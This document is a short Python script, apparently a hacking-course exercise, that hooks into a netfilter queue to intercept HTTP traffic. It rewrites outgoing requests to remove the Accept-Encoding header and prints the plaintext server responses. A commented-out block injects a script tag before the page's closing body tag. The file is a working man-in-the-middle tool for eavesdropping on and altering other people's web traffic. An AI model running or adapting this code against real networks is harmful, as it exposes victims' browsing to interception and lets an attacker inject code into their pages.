#!/usr/bin/env python
import scapy.all as scapy
import netfilterqueue
import re


def set_load(packet, load):
    try:
        packet[scapy.Raw].load = load
        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.TCP].chksum
        return packet
    except IndexError:
        print("[-] No TCP Layer found")


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):
        try:
            if scapy_packet[scapy.TCP].dport == 80:
                load = scapy_packet[scapy.Raw].load
                modified_load = re.sub('Accept-Encoding:.*?\\r\\n', "", load.decode())
                # print(new)
                modified_packet = set_load(scapy_packet, modified_load.encode())
                packet.set_payload(bytes(modified_packet))
            elif scapy_packet[scapy.TCP].sport == 80:
                # print("Hello")
                decoded_packet = str(scapy_packet[scapy.Raw].load)
                print(decoded_packet)
                # modified_load = decoded_packet.replace("</body>", "<script>alert('PWND!!!')</body>")
                # modified_packet = set_load(scapy_packet, modified_load)
                # packet.set_payload(bytes(modified_packet))
        except IndexError:
            print("[-] No TCP Layer found")

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

